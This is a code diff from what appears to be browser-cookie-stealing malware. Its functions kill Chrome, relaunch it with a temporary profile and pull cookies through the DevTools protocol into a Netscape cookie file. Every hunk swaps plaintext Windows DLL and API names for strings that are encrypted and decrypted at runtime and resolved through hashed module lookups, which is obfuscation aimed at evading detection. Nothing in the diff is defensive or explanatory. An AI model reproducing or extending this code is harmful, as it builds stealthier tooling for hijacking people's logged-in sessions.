@@ -303,7 +303,8 @@ static int write_netscape_cookies(const char *json_resp, const char *output_path
 /* ── Get Chrome exe path from registry ────────────────────────── */
 
 static int get_chrome_exe_path(char *out, size_t out_max) {
-    void *ntdll = mirage_get_module_by_hash(mirage_encrypted_hash_module("ntdll.dll"));
+    char dll_g[32]; enc_decrypt(enc_ntdll, ENC_NTDLL_LEN, dll_g);
+    void *ntdll = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll_g));
     if (!ntdll) return -1;
 
     /* Open HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe */
@@ -344,7 +345,8 @@ static int get_chrome_exe_path(char *out, size_t out_max) {
                                (uint64_t)&result_len);
 
     typedef NTSTATUS (WINAPI *pNtClose)(HANDLE);
-    pNtClose fnNtClose = (pNtClose)resolve_fn(ntdll, "NtClose");
+    char fn_g[32]; enc_decrypt(enc_NtClose, ENC_NTCLOSE_LEN, fn_g);
+    pNtClose fnNtClose = (pNtClose)resolve_fn(ntdll, fn_g);
     if (fnNtClose) fnNtClose(hKey);
 
     if (st < 0) return -1;
@@ -365,8 +367,10 @@ static int get_chrome_exe_path(char *out, size_t out_max) {
 /* ── cdp_grab_cookies ─────────────────────────────────────────── */
 
 int cdp_grab_cookies(const char *chrome_exe_path, const char *output_path) {
-    void *kernel32 = mirage_get_module_by_hash(mirage_encrypted_hash_module("kernel32.dll"));
-    void *user32 = mirage_get_module_by_hash(mirage_encrypted_hash_module("user32.dll"));
+    char dll_c[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll_c);
+    void *kernel32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll_c));
+    char dll_u[32]; enc_decrypt(enc_user32, ENC_USER32_LEN, dll_u);
+    void *user32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll_u));
     if (!kernel32 || !user32) return -1;
 
     /* Get Chrome path */
@@ -382,7 +386,7 @@ int cdp_grab_cookies(const char *chrome_exe_path, const char *output_path) {
     kill_browser_processes("chrome");
 
     /* Get temp path for user data dir */
-    pGetTempPathW fnGetTempPath = (pGetTempPathW)resolve_fn(kernel32, "GetTempPathW");
+    pGetTempPathW fnGetTempPath = (pGetTempPathW)({ char fn_c[32]; enc_decrypt(enc_GetTempPathW, ENC_GETTEMPPATHW_LEN, fn_c); resolve_fn(kernel32, fn_c); });
     if (!fnGetTempPath) return -1;
 
     wchar_t temp_dir[MAX_PATH];
@@ -403,9 +407,9 @@ int cdp_grab_cookies(const char *chrome_exe_path, const char *output_path) {
                   chrome_path, p, temp_dir);
 
         /* Launch Chrome */
-        pCreateProcessW fnCreateProcess = (pCreateProcessW)resolve_fn(kernel32, "CreateProcessW");
-        pWaitForSingleObject fnWait = (pWaitForSingleObject)resolve_fn(kernel32, "WaitForSingleObject");
-        pCloseHandle fnClose = (pCloseHandle)resolve_fn(kernel32, "CloseHandle");
+        pCreateProcessW fnCreateProcess = (pCreateProcessW)({ char fn_c[32]; enc_decrypt(enc_CreateProcessW, ENC_CREATEPROCESSW_LEN, fn_c); resolve_fn(kernel32, fn_c); });
+        pWaitForSingleObject fnWait = (pWaitForSingleObject)({ char fn_c[32]; enc_decrypt(enc_WaitForSingleObject, ENC_WAITFORSINGLEOBJECT_LEN, fn_c); resolve_fn(kernel32, fn_c); });
+        pCloseHandle fnClose = (pCloseHandle)({ char fn_c[32]; enc_decrypt(enc_CloseHandle, ENC_CLOSEHANDLE_LEN, fn_c); resolve_fn(kernel32, fn_c); });
         if (!fnCreateProcess || !fnWait || !fnClose) return -1;
 
         STARTUPINFOW si = {0};
@@ -433,7 +437,7 @@ int cdp_grab_cookies(const char *chrome_exe_path, const char *output_path) {
 
         if (port == 0) {
             /* Chrome didn't start — kill it */
-            pTerminateProcess fnTerm = (pTerminateProcess)resolve_fn(kernel32, "TerminateProcess");
+            pTerminateProcess fnTerm = (pTerminateProcess)({ char fn_c[32]; enc_decrypt(enc_TerminateProcess, ENC_TERMINATEPROCESS_LEN, fn_c); resolve_fn(kernel32, fn_c); });
             if (fnTerm) fnTerm(pi.hProcess, 1);
         }
 
